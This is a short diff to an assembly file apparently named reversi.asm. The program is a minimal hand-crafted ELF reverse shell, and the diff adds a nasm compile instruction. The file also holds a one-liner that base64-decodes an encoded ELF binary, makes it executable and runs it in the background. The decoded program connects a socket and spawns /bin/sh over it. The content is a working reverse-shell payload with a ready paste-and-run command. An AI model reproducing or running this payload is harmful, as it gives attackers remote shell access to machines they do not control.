@@ -90,5 +90,7 @@ dup2_loop:
   mov rsi, rsp                  ;               4889e6 | move pointer to it to rsi
   jmp short execy               ;                 eb8d | Back up into program headers
   
+  ; Compile
+  ; nasm -f bin -o reversi reversi.asm
   ; One liner
   ; base64 -d <<< f0VMRmopWGoCX2oBXpnrPAIAPgABAAAABAAAAAEAAAAcAAAAAAAAAAAAAAAAAAAAAQAAAEAAOAABAAIABDsPBQAAAAAEOw8FAAAAAA8FSJfHRCT8fwAAAWbHRCT6pBDGRCT4AkiD7AhqKlhIieZqEFoPBWoDXkj/zmohWA8FdfaZiEQk/0iD7AFSSI10JPCAwhAPBUgxwEi7L2Jpbi8vc2hTSInnUEiJ4ldIiebrjQ== > s;chmod +x s;./s &
